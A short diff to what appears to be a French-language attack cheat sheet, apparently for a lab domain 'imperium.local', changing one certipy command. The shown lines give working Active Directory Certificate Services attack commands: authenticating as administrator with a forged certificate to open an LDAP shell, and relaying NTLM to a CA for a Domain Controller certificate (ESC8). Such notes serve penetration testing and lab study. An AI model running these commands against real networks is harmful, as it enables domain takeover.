@@ -79,7 +79,7 @@ certipy req -u $USER -p $PASSWORD -ca 'IMPERIUM-CA' -template 'InterstellarTrans
 
 certipy -debug auth -pfx administrator.pfx -domain imperium.local -dc-ip 10.2.62.87 -ldap-shell  # Utilise le certificat pour s’authentifier comme le compte cible et ouvrir un shell LDAP
 
-certipy-ad relay -target http://10.2.62.84/certsrv/certfnsh.asp -template 'DomainController'  # Relaye une authentification NTLM vers la CA pour obtenir un certificat de type Domain Controller (ESC8)
+certipy relay -target http://10.2.62.84/certsrv/certfnsh.asp -template 'DomainController'  # Relaye une authentification NTLM vers la CA pour obtenir un certificat de type Domain Controller (ESC8)
  
 ```
 
